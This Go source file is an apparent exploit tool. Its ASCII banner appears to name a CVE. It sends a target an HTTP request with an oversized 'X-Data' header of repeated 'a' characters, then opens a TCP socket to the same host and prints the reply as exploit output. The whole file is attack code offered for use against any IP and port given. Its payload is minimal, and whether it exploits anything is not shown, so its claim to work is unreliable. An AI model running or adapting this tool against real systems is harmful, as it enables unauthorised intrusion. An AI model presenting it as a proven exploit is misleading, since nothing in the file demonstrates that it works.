package main

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	IP   string
	Port string
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <ip> <port>")
		return
	}

	arg := os.Args[1]
	err := extractIPAndPort(arg)
	if err != nil {
		IP = arg
		if len(os.Args) > 2 {
			Port = os.Args[2]
		} else {
			fmt.Println(err)
			return
		}
	}

	banner()
	exploit()
}

func banner() {
	bannerColor := "\033[34m" // ANSI color code for blue
	redColor := "\033[31m"    // ANSI color code for red
	resetColor := "\033[0m"   // ANSI color code to reset color

	banner := bannerColor +
		` ________  ___      ___ _______ 
|\   ____\|\  \    /  /|\  ___ \ 
\ \  \___|\ \  \  /  / | \   __/|
 \ \  \    \ \  \/  / / \ \  \_|/__
  \ \  \____\ \    / /   \ \  \_|\ \
   \ \_______\ \__/ /     \ \_______\
    \|_______|\|__|/       \|_______|` +
		redColor +
		`                                
 _______  ________    _______   _______                ___   ___  ________   _____    _____
 /  ___  \|\   __  \  /  ___  \ /  ___  \              |\  \ |\  \|\   ____\ / __  \  / __  \
/__/|_/  /\ \  \|\  \/__/|_/  //__/|_/  /| ____________\ \  \\_\  \ \  \___||\/_|\  \|\/_|\  \
|__|//  / /\\ \  \\\  \__|//  / /__|//  / /|\____________\ \______  \ \  \___\|/ \ \  \|/ \ \  \
    /  /_/__\\ \  \\\  \  /  /_/__  /  /_/_\|____________|\|_____|\  \ \  ___  \  \ \  \   \ \  \
   |\________\\ \_______\|\________\\________\                   \ \__\ \_______\  \ \__\   \ \__\
    \|_______| \|_______| \|_______| \|_______|                    \|__|\|_______|   \|__|    \|__|` + "\n" +
		resetColor

	fmt.Println(banner)
}

func extractIPAndPort(arg string) error {
	parts := strings.Split(arg, ":")
	if len(parts) == 1 {
		return fmt.Errorf("Invalid input format. Please provide IP and port as 'ip:port' or separate arguments.")
	} else if len(parts) > 2 {
		return fmt.Errorf("Invalid input format. Please provide IP and port as 'ip:port' or separate arguments.")
	}
	IP = parts[0]
	Port = parts[1]
	return nil
}

func exploit() {
	fmt.Println("\033[32m[+] Starting exploiting", IP+":"+Port, "\033[0m")
	time.Sleep(5 * time.Second)

	serverAddr := fmt.Sprintf("http://%s:%s", IP, Port)
	client := &http.Client{}

	req, err := http.NewRequest("GET", serverAddr, nil)
	if err != nil {
		fmt.Println("\033[31mError creating HTTP request:", err, "\033[0m")
		return
	}

	req.Proto = "HTTP/1.1"
	req.Host = IP
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0")
	req.Header.Set("Content-Type", "application/json")
	xdata := strings.Repeat("a", 5*36)
	req.Header.Set("X-Data", xdata)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("\033[31mError sending HTTP request:", err, "\033[0m")
		return
	}
	defer resp.Body.Close()

	time.Sleep(1 * time.Second)

	// Create a new TCP socket
	socket, err := net.Dial("tcp", IP+":"+Port)
	if err != nil {
		fmt.Println("\033[31mError creating TCP socket:", err, "\033[0m")
		return
	}
	defer socket.Close()

	startCheckingOutput(socket)
}

func startCheckingOutput(socket net.Conn) {
	time.Sleep(1 * time.Second)

	fmt.Println("\033[32m[+] Exploited Start Checking Output...\033[0m")

	// Receive data from the socket
	output := make([]byte, 4069)
	_, err := socket.Read(output)
	if err != nil {
		fmt.Println("\033[31mError reading data from socket:", err, "\033[0m")
		return
	}

	// Decode and print the received data
	data := string(output)
	fmt.Println(data)
}
